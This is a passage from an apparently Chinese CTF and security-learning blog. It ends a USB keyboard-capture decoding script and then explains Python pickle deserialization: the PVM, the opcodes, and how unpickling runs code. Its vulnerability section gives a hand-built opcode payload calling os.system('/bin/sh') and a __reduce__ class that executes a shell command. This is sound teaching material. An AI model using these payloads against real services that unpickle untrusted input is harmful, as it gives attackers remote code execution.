class="string">&quot;&lt;GA&gt;&quot;</span>,<span class="string">&quot;36&quot;</span>:<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;37&quot;</span>:<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;38&quot;</span>:<span class="string">&quot;?&quot;</span>,<span class="string">&quot;39&quot;</span>:<span class="string">&quot;&lt;CAP&gt;&quot;</span>,<span class="string">&quot;3a&quot;</span>:<span class="string">&quot;&lt;F1&gt;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;3b&quot;</span>:<span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>:<span class="string">&quot;&lt;F3&gt;&quot;</span>,<span class="string">&quot;3d&quot;</span>:<span class="string">&quot;&lt;F4&gt;&quot;</span>,<span class="string">&quot;3e&quot;</span>:<span class="string">&quot;&lt;F5&gt;&quot;</span>,<span class="string">&quot;3f&quot;</span>:<span class="string">&quot;&lt;F6&gt;&quot;</span>,<span class="string">&quot;40&quot;</span>:<span class="string">&quot;&lt;F7&gt;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;41&quot;</span>:<span class="string">&quot;&lt;F8&gt;&quot;</span>,<span class="string">&quot;42&quot;</span>:<span class="string">&quot;&lt;F9&gt;&quot;</span>,<span class="string">&quot;43&quot;</span>:<span class="string">&quot;&lt;F10&gt;&quot;</span>,<span class="string">&quot;44&quot;</span>:<span class="string">&quot;&lt;F11&gt;&quot;</span>,<span class="string">&quot;45&quot;</span>:<span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> line[<span class="number">1</span>]!=<span class="string">&#x27;2&#x27;</span>) <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">6</span>:<span class="number">8</span>]==<span class="string">&quot;00&quot;</span>:</span><br><span class="line">             <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">in</span> normalKeys.keys():</span><br><span class="line">            output += [[normalKeys[line[<span class="number">6</span>:<span class="number">8</span>]]],[shiftKeys[line[<span class="number">6</span>:<span class="number">8</span>]]]][line[<span class="number">1</span>]==<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output += [<span class="string">&#x27;[unknown]&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        a=output.index(<span class="string">&#x27;&lt;DEL&gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">del</span> output[a]</span><br><span class="line">        <span class="keyword">del</span> output[a-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> output[i]==<span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">            flag+=<span class="number">1</span></span><br><span class="line">            output.pop(i)</span><br><span class="line">            <span class="keyword">if</span> flag==<span class="number">2</span>:</span><br><span class="line">                flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> flag!=<span class="number">0</span>:</span><br><span class="line">            output[i]=output[i].upper()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;output :&#x27;</span> + <span class="string">&quot;&quot;</span>.join(output))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后可能会将十六进制转换为字符串</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m=<span class="string">&quot;666C61677B38663965643266393333656631346138643035323364303334396531323939637D&quot;</span></span><br><span class="line">s=<span class="built_in">bytes</span>.fromhex(m)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 其他 </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pickle反序列化</title>
      <link href="/2024/05/13/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/05/13/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="pickle反序列化"><a href="#pickle反序列化" class="headerlink" title="pickle反序列化"></a>pickle反序列化</h1><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><h3 id="什么是Pickle"><a href="#什么是Pickle" class="headerlink" title="什么是Pickle"></a>什么是Pickle</h3><p><strong>pickle是Python中一个能够序列化和反序列化对象的模块</strong>。和其他语言类似，Python也提供了序列化和反序列化这一功能，其中一个实现模块就是pickle。在Python中，“Pickling” 是将 Python 对象及其所拥有的层次结构转化为一个二进制字节流的过程，也就是我们常说的序列化，而 <em>“unpickling”</em> 是相反的操作，会将字节流转化回一个对象层次结构。</p><p>当然在Python 中并不止pickle一个模块能够进行这一操作，更原始的序列化模块如<code>marshal</code>，同样能够完成序列化的任务，不过两者的侧重点并不相同，<code>marshal</code>存在主要是为了支持 Python 的<code>.pyc</code>文件。现在开发时一般首选pickle。</p><p>pickle实际上可以看作一种独立的语言，通过对<code>opcode</code>的编写可以进行Python代码执行、覆盖变量等操作。<strong>直接编写的<code>opcode</code>灵活性比使用pickle序列化生成的代码更高，并且有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力</strong>）。</p><p>既然opcode能够执行Python代码，那自然就免不了安全问题。以下是Python在pickle文档中的警告。</p><p><img src="https://bu.dusays.com/2024/05/13/6641a597d329e.png" alt="image-20240319204712798"></p><h3 id="pickle工作原理"><a href="#pickle工作原理" class="headerlink" title="pickle工作原理"></a>pickle工作原理</h3><p>python为我们提供了两个比较重要的库pickle 和 cpickle 后者 是底层使用c语言书写 速度是pickle 的1000倍 但是接口相同</p><p>其实pickle可以看作是一种独立的栈语言，它由一串串opcode（指令集）组成。该语言的解析是依靠Pickle Virtual Machine （PVM）进行的。</p><p>PVM由以下三部分组成：</p><blockquote><ul><li><p>指令处理器（引擎）</p><p>从流中读取 opcode 和参数，并对其进行解释处理。重复这个动作，直到遇到 . 这个结束符后停止。最终留在栈顶的值将被作为反序列化对象返回。</p><p>从头开始读取流中的操作码和参数 并对其进行解释处理在这个过程中会改变栈区和标签区直到遇到.这个结束符后停止处理结束之后会到达栈顶形成并返回反序列化的对象</p></li><li><p>stack（栈区）</p><p>由 Python 的 list 实现，被用来临时存储数据、参数以及对象。</p><p>作为流数据处理过程中的暂存区在不断的进出过程中完成对数据流的反序列化并最终在栈上生成反序列化的结果 由python的list实现</p></li><li><p>memo</p><p>由 Python 的 dict 实现，为 PVM 的整个生命周期提供存储。</p><p>如同其名 是数据的一个索引 或者 标记 由python的dict实现为PVM整个生命周期提供存储</p></li></ul></blockquote><p><img src="https://bu.dusays.com/2024/05/13/6641a597bd44b.png" alt="image-20240319210513560"></p><p>栈是一种存储数据的结构.栈有压栈和弹栈两种操作.</p><p>可以把栈看做一个弹夹,先进栈的数据后出栈,压栈就像压子弹,弹栈就像弹子弹.</p><p>当前用于 pickling 的协议共有 5 种。使用的协议版本越高，读取生成的 pickle 所需的 Python 版本就要越新。</p><blockquote><ul><li>v0 版协议是原始的“人类可读”协议，并且向后兼容早期版本的 Python。</li><li>v1 版协议是较早的二进制格式，它也与早期版本的 Python 兼容。</li><li>v2 版协议是在 Python 2.3 中引入的。它为存储 <a href="https://docs.python.org/zh-cn/3.7/glossary.html#term-new-style-class">new-style class</a> 提供了更高效的机制。欲了解有关第 2 版协议带来的改进，请参阅 <a href="https://www.python.org/dev/peps/pep-0307"><strong>PEP 307</strong></a>。</li><li>v3 版协议添加于 Python 3.0。它具有对 <a href="https://docs.python.org/zh-cn/3.7/library/stdtypes.html#bytes"><code>bytes</code></a> 对象的显式支持，且无法被 Python 2.x 打开。这是目前默认使用的协议，也是在要求与其他 Python 3 版本兼容时的推荐协议。</li><li>v4 版协议添加于 Python 3.4。它支持存储非常大的对象，能存储更多种类的对象，还包括一些针对数据格式的优化。有关第 4 版协议带来改进的信息，请参阅 <a href="https://www.python.org/dev/peps/pep-3154"><strong>PEP 3154</strong></a>。</li></ul></blockquote><p><strong>pickle协议是向前兼容的</strong> ，0号版本的字符串可以直接交给pickle.loads()，不用担心引发什么意外</p><h2 id="pickle模块常见方法及接口"><a href="#pickle模块常见方法及接口" class="headerlink" title="pickle模块常见方法及接口"></a>pickle模块常见方法及接口</h2><blockquote><p>也就是pickle库中 序列化与反序列化的一些方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pickle.dump(*obj*, *file*, *protocol=None*, ***, *fix_imports=True*)</span><br></pre></td></tr></table></figure><p>将打包好的对象 <em>obj</em> 写入文件中，其中protocol为pickling的协议版本（下同）。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pickle.dumps(*obj*, *protocol=None*, ***, *fix_imports=True*)</span><br></pre></td></tr></table></figure><p>将 <em>obj</em> 打包以后的对象作为bytes类型直接返回。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pickle.load(*file*, ***, *fix_imports=True*, *encoding=&quot;ASCII&quot;*, *errors=&quot;strict&quot;*)</span><br></pre></td></tr></table></figure><p>从文件中读取二进制字节流，将其反序列化为一个对象并返回。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pickle.loads(*data*, ***, *fix_imports=True*, *encoding=&quot;ASCII&quot;*, *errors=&quot;strict&quot;*)</span><br></pre></td></tr></table></figure><p>从data中读取二进制字节流，将其反序列化为一个对象并返回。</p></blockquote><p>obj：想要序列化的obj对象。<br>protocal：如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。</p><p><strong>两个dump函数是把python对象转换为二进制对象（序列化）,两个load函数是把二进制对象转换为python对象（反序列化）</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.age=<span class="number">18</span></span><br><span class="line">        self.name=<span class="string">&quot;Pickle&quot;</span></span><br><span class="line"> </span><br><span class="line">p=Person()</span><br><span class="line">opcode=pickle.dumps(p)</span><br><span class="line"><span class="built_in">print</span>(opcode)</span><br><span class="line"><span class="comment">#结果如下</span></span><br><span class="line"><span class="comment">#b&#x27;\x80\x04\x957\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x06Person\x94\x93\x94)\x81\x94&#125;\x94(\x8c\x03age\x94K\x12\x8c\x04name\x94\x8c\x06Pickle\x94ub.&#x27;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">P=pickle.loads(opcode)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The age is:&#x27;</span>+<span class="built_in">str</span>(P.age),<span class="string">&#x27;The name is:&#x27;</span>+P.name)</span><br><span class="line"><span class="comment">#结果如下</span></span><br><span class="line"><span class="comment">#The age is:18 The name is:Pickle</span></span><br></pre></td></tr></table></figure><p>如上述代码</p><p>这里我创建了一个Person类，其中有两个属性age和name。我首先使用了<code>pickle.dumps()</code>函数将一个Person对象序列化成二进制字节流的形式。然后使用<code>pickle.loads()</code>将一串二进制字节流反序列化为一个Person对象。</p><h2 id="能够序列化的对象"><a href="#能够序列化的对象" class="headerlink" title="能够序列化的对象"></a>能够序列化的对象</h2><ul><li><code>None</code>、<code>True</code> 和 <code>False</code></li><li>整数、浮点数、复数</li><li><code>str</code>、<code>byte</code>、<code>bytearray</code></li><li>只包含可打包对象的集合，包括 tuple、list、set 和 dict</li><li>定义在模块顶层的函数（使用 <a href="https://docs.python.org/zh-cn/3.7/reference/compound_stmts.html#def"><code>def</code></a> 定义，<a href="https://docs.python.org/zh-cn/3.7/reference/expressions.html#lambda"><code>lambda</code></a> 函数则不可以）</li><li>定义在模块顶层的内置函数</li><li>定义在模块顶层的类</li><li>某些类实例，这些类的 <a href="https://docs.python.org/zh-cn/3.7/library/stdtypes.html#object.__dict__"><code>__dict__</code></a> 属性值或 <a href="https://docs.python.org/zh-cn/3.7/library/pickle.html#object.__getstate__"><code>__getstate__()</code></a> 函数的返回值可以被打包</li></ul><p>对于不能序列化的类型，如lambda函数，使用pickle模块时则会抛出 <a href="https://docs.python.org/zh-cn/3.7/library/pickle.html#pickle.PicklingError"><code>PicklingError</code></a> 异常</p><h2 id="常用opcode"><a href="#常用opcode" class="headerlink" title="常用opcode"></a>常用opcode</h2><p>在Python的pickle.py中，我们能够找到所有的opcode及其解释，常用的opcode如下，这里我们以V0版本为例</p><table><thead><tr><th align="left">指令</th><th align="left">描述</th><th align="left">具体写法</th><th align="left">栈上的变化</th></tr></thead><tbody><tr><td align="left">c</td><td align="left">获取一个全局对象或import一个模块</td><td align="left">c[module]\n[instance]\n</td><td align="left">获得的对象入栈</td></tr><tr><td align="left">o</td><td align="left">寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td><td align="left">o</td><td align="left">这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td></tr><tr><td align="left">i</td><td align="left">相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td><td align="left">i[module]\n[callable]\n</td><td align="left">这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td></tr><tr><td align="left">N</td><td align="left">实例化一个None</td><td align="left">N</td><td align="left">获得的对象入栈</td></tr><tr><td align="left">S</td><td align="left">实例化一个字符串对象</td><td align="left">S’xxx’\n（也可以使用双引号、&#39;等python字符串形式）</td><td align="left">获得的对象入栈</td></tr><tr><td align="left">V</td><td align="left">实例化一个UNICODE字符串对象</td><td align="left">Vxxx\n</td><td align="left">获得的对象入栈</td></tr><tr><td align="left">I</td><td align="left">实例化一个int对象</td><td align="left">Ixxx\n</td><td align="left">获得的对象入栈</td></tr><tr><td align="left">F</td><td align="left">实例化一个float对象</td><td align="left">Fx.x\n</td><td align="left">获得的对象入栈</td></tr><tr><td align="left">R</td><td align="left">选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td><td align="left">R</td><td align="left">函数和参数出栈，函数的返回值入栈</td></tr><tr><td align="left">.</td><td align="left">程序结束，栈顶的一个元素作为pickle.loads()的返回值</td><td align="left">.</td><td align="left">无</td></tr><tr><td align="left">(</td><td align="left">向栈中压入一个MARK标记</td><td align="left">(</td><td align="left">MARK标记入栈</td></tr><tr><td align="left">t</td><td align="left">寻找栈中的上一个MARK，并组合之间的数据为元组</td><td align="left">t</td><td align="left">MARK标记以及被组合的数据出栈，获得的对象入栈</td></tr><tr><td align="left">)</td><td align="left">向栈中直接压入一个空元组</td><td align="left">)</td><td align="left">空元组入栈</td></tr><tr><td align="left">l</td><td align="left">寻找栈中的上一个MARK，并组合之间的数据为列表</td><td align="left">l</td><td align="left">MARK标记以及被组合的数据出栈，获得的对象入栈</td></tr><tr><td align="left">]</td><td align="left">向栈中直接压入一个空列表</td><td align="left">]</td><td align="left">空列表入栈</td></tr><tr><td align="left">d</td><td align="left">寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td><td align="left">d</td><td align="left">MARK标记以及被组合的数据出栈，获得的对象入栈</td></tr><tr><td align="left">}</td><td align="left">向栈中直接压入一个空字典</td><td align="left">}</td><td align="left">空字典入栈</td></tr><tr><td align="left">p</td><td align="left">将栈顶对象储存至memo_n</td><td align="left">pn\n</td><td align="left">无</td></tr><tr><td align="left">g</td><td align="left">将memo_n的对象压栈</td><td align="left">gn\n</td><td align="left">对象被压栈</td></tr><tr><td align="left">0</td><td align="left">丢弃栈顶对象</td><td align="left">0</td><td align="left">栈顶对象被丢弃</td></tr><tr><td align="left">b</td><td align="left">使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td><td align="left">b</td><td align="left">栈上第一个元素出栈</td></tr><tr><td align="left">s</td><td align="left">将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td><td align="left">s</td><td align="left">第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td></tr><tr><td align="left">u</td><td align="left">寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td><td align="left">u</td><td align="left">MARK标记以及被组合的数据出栈，字典被更新</td></tr><tr><td align="left">a</td><td align="left">将栈的第一个元素append到第二个元素(列表)中</td><td align="left">a</td><td align="left">栈顶元素出栈，第二个元素（列表）被更新</td></tr><tr><td align="left">e</td><td align="left">寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td><td align="left">e</td><td align="left">MARK标记以及被组合的数据出栈，列表被更新</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MARK           = b&#x27;(&#x27;   # push special markobject on stack</span><br><span class="line">STOP           = b&#x27;.&#x27;   # every pickle ends with STOP</span><br><span class="line">POP            = b&#x27;0&#x27;   # discard topmost stack item</span><br><span class="line">POP_MARK       = b&#x27;1&#x27;   # discard stack top through topmost markobject</span><br><span class="line">DUP            = b&#x27;2&#x27;   # duplicate top stack item</span><br><span class="line">FLOAT          = b&#x27;F&#x27;   # push float object; decimal string argument</span><br><span class="line">INT            = b&#x27;I&#x27;   # push integer or bool; decimal string argument</span><br><span class="line">BININT         = b&#x27;J&#x27;   # push four-byte signed int</span><br><span class="line">BININT1        = b&#x27;K&#x27;   # push 1-byte unsigned int</span><br><span class="line">LONG           = b&#x27;L&#x27;   # push long; decimal string argument</span><br><span class="line">BININT2        = b&#x27;M&#x27;   # push 2-byte unsigned int</span><br><span class="line">NONE           = b&#x27;N&#x27;   # push None</span><br><span class="line">PERSID         = b&#x27;P&#x27;   # push persistent object; id is taken from string arg</span><br><span class="line">BINPERSID      = b&#x27;Q&#x27;   #  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stack</span><br><span class="line">REDUCE         = b&#x27;R&#x27;   # apply callable to argtuple, both on stack</span><br><span class="line">STRING         = b&#x27;S&#x27;   # push string; NL-terminated string argument</span><br><span class="line">BINSTRING      = b&#x27;T&#x27;   # push string; counted binary string argument</span><br><span class="line">SHORT_BINSTRING= b&#x27;U&#x27;   #  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &amp;lt; 256 bytes</span><br><span class="line">UNICODE        = b&#x27;V&#x27;   # push Unicode string; raw-unicode-escaped&#x27;d argument</span><br><span class="line">BINUNICODE     = b&#x27;X&#x27;   #   &quot;     &quot;       &quot;  ; counted UTF-8 string argument</span><br><span class="line">APPEND         = b&#x27;a&#x27;   # append stack top to list below it</span><br><span class="line">BUILD          = b&#x27;b&#x27;   # call __setstate__ or __dict__.update()</span><br><span class="line">GLOBAL         = b&#x27;c&#x27;   # push self.find_class(modname, name); 2 string args</span><br><span class="line">DICT           = b&#x27;d&#x27;   # build a dict from stack items</span><br><span class="line">EMPTY_DICT     = b&#x27;&#125;&#x27;   # push empty dict</span><br><span class="line">APPENDS        = b&#x27;e&#x27;   # extend list on stack by topmost stack slice</span><br><span class="line">GET            = b&#x27;g&#x27;   # push item from memo on stack; index is string arg</span><br><span class="line">BINGET         = b&#x27;h&#x27;   #   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte arg</span><br><span class="line">INST           = b&#x27;i&#x27;   # build &amp;amp; push class instance</span><br><span class="line">LONG_BINGET    = b&#x27;j&#x27;   # push item from memo on stack; index is 4-byte arg</span><br><span class="line">LIST           = b&#x27;l&#x27;   # build list from topmost stack items</span><br><span class="line">EMPTY_LIST     = b&#x27;]&#x27;   # push empty list</span><br><span class="line">OBJ            = b&#x27;o&#x27;   # build &amp;amp; push class instance</span><br><span class="line">PUT            = b&#x27;p&#x27;   # store stack top in memo; index is string arg</span><br><span class="line">BINPUT         = b&#x27;q&#x27;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte arg</span><br><span class="line">LONG_BINPUT    = b&#x27;r&#x27;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte arg</span><br><span class="line">SETITEM        = b&#x27;s&#x27;   # add key+value pair to dict</span><br><span class="line">TUPLE          = b&#x27;t&#x27;   # build tuple from topmost stack items</span><br><span class="line">EMPTY_TUPLE    = b&#x27;)&#x27;   # push empty tuple</span><br><span class="line">SETITEMS       = b&#x27;u&#x27;   # modify dict by adding topmost key+value pairs</span><br><span class="line">BINFLOAT       = b&#x27;G&#x27;   # push float; arg is 8-byte float encoding</span><br><span class="line"></span><br><span class="line">TRUE           = b&#x27;I01\n&#x27;  # not an opcode; see INT docs in pickletools.py</span><br><span class="line">FALSE          = b&#x27;I00\n&#x27;  # not an opcode; see INT docs in pickletools.py</span><br><span class="line"></span><br><span class="line"># Protocol 2</span><br><span class="line"></span><br><span class="line">PROTO          = b&#x27;\x80&#x27;  # identify pickle protocol</span><br><span class="line">NEWOBJ         = b&#x27;\x81&#x27;  # build object by applying cls.__new__ to argtuple</span><br><span class="line">EXT1           = b&#x27;\x82&#x27;  # push object from extension registry; 1-byte index</span><br><span class="line">EXT2           = b&#x27;\x83&#x27;  # ditto, but 2-byte index</span><br><span class="line">EXT4           = b&#x27;\x84&#x27;  # ditto, but 4-byte index</span><br><span class="line">TUPLE1         = b&#x27;\x85&#x27;  # build 1-tuple from stack top</span><br><span class="line">TUPLE2         = b&#x27;\x86&#x27;  # build 2-tuple from two topmost stack items</span><br><span class="line">TUPLE3         = b&#x27;\x87&#x27;  # build 3-tuple from three topmost stack items</span><br><span class="line">NEWTRUE        = b&#x27;\x88&#x27;  # push True</span><br><span class="line">NEWFALSE       = b&#x27;\x89&#x27;  # push False</span><br><span class="line">LONG1          = b&#x27;\x8a&#x27;  # push long from &amp;lt; 256 bytes</span><br><span class="line">LONG4          = b&#x27;\x8b&#x27;  # push really big long</span><br><span class="line"></span><br><span class="line">_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]</span><br><span class="line"></span><br><span class="line"># Protocol 3 (Python 3.x)</span><br><span class="line"></span><br><span class="line">BINBYTES       = b&#x27;B&#x27;   # push bytes; counted binary string argument</span><br><span class="line">SHORT_BINBYTES = b&#x27;C&#x27;   #  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &amp;lt; 256 bytes</span><br><span class="line"></span><br><span class="line"># Protocol 4</span><br><span class="line"></span><br><span class="line">SHORT_BINUNICODE = b&#x27;\x8c&#x27;  # push short string; UTF-8 length &amp;lt; 256 bytes</span><br><span class="line">BINUNICODE8      = b&#x27;\x8d&#x27;  # push very long string</span><br><span class="line">BINBYTES8        = b&#x27;\x8e&#x27;  # push very long bytes string</span><br><span class="line">EMPTY_SET        = b&#x27;\x8f&#x27;  # push empty set on the stack</span><br><span class="line">ADDITEMS         = b&#x27;\x90&#x27;  # modify set by adding topmost stack items</span><br><span class="line">FROZENSET        = b&#x27;\x91&#x27;  # build frozenset from topmost stack items</span><br><span class="line">NEWOBJ_EX        = b&#x27;\x92&#x27;  # like NEWOBJ but work with keyword only arguments</span><br><span class="line">STACK_GLOBAL     = b&#x27;\x93&#x27;  # same as GLOBAL but using names on the stacks</span><br><span class="line">MEMOIZE          = b&#x27;\x94&#x27;  # store top of the stack in memo</span><br><span class="line">FRAME            = b&#x27;\x95&#x27;  # indicate the beginning of a new frame</span><br><span class="line"></span><br><span class="line"># Protocol 5</span><br><span class="line"></span><br><span class="line">BYTEARRAY8       = b&#x27;\x96&#x27;  # push bytearray</span><br><span class="line">NEXT_BUFFER      = b&#x27;\x97&#x27;  # push next out-of-band buffer</span><br><span class="line">READONLY_BUFFER  = b&#x27;\x98&#x27;  # make top of stack readonly</span><br></pre></td></tr></table></figure><blockquote><p>S : 后面跟的是字符串<br>( ：作为命令执行到哪里的一个标记<br>t ：将从 t 到标记的全部元素组合成一个元祖，然后放入栈中<br>c ：定义模块名和类名（模块名和类名之间使用回车分隔）<br>R ：从栈中取出可调用函数以及元祖形式的参数来执行，并把结果放回栈中<br>. ：点号是结束符</p></blockquote><p>例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">opcode=cos</span><br><span class="line">system</span><br><span class="line">(S&#x27;/bin/sh&#x27;</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure><blockquote><p>第一行的c 后面是模块名 换行之后是类名 于是就将os.system放入栈中</p><p>然后的( 是标记符 我们将一个标记放入栈中</p><p>S的后面是字符串 放入栈中</p><p>t将栈中标记之前的内容取出来转化成元组 再存入栈中（’&#x2F;bin&#x2F;sh’,）随后 标记消失</p><p>然后 R将元组取出 并将callable取出 将元组作为callable的参数 并执行 对应这里就是os.system(‘&#x2F;bin&#x2F;sh’) 然后再将结果存入栈中</p></blockquote><h2 id="简单pickle反序列化漏洞"><a href="#简单pickle反序列化漏洞" class="headerlink" title="简单pickle反序列化漏洞"></a>简单pickle反序列化漏洞</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.age=<span class="number">18</span></span><br><span class="line">        self.name=<span class="string">&quot;Pickle&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        command=<span class="string">r&quot;whoami&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(command,))</span><br><span class="line"> </span><br><span class="line">p=Person()</span><br><span class="line">opcode=pickle.dumps(p)</span><br><span class="line"><span class="built_in">print</span>(opcode)</span><br><span class="line"> </span><br><span class="line">P=pickle.loads(opcode)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The age is:&#x27;</span>+<span class="built_in">str</span>(P.age),<span class="string">&#x27;The name is:&#x27;</span>+P.name)</span><br></pre></td></tr></table></figure><p>Person类中加入了<code>__reduce__</code>函数，该函数能够定义该类的二进制字节流被反序列化时进行的操作。返回值是一个<code>(callable, ([para1,para2...])[,...])</code>类型的元组。当字节流被反序列化时，Python就会执行<code>callable(para1,para2...)</code>函数。因此当上述的Person对象被<code>unpickling</code>时，就会执行<code>os.system(command)</code></p><p><code>__reduce__()</code> 其实是 <code>object</code>类中的一个魔术方法，<strong>它会在反序列化过程开始时被调用</strong>，我们可以通过重写<code>object.__reduce__()</code> 函数，使之在被实例化时按照重写的方式进行。</p><p>Python 要求该方法返回一个字符串或者元组。如果返回元组<code>(callable, ([para1,para2...])[,...])</code> ，那么每当该类的对象被反序列化时，该 callable 就会被调用，参数为<code>para1</code>、<code>para2</code> … 后面再详细解释</p><h3 id="python的魔术方法"><a href="#python的魔术方法" class="headerlink" title="python的魔术方法"></a>python的魔术方法</h3><p>由此 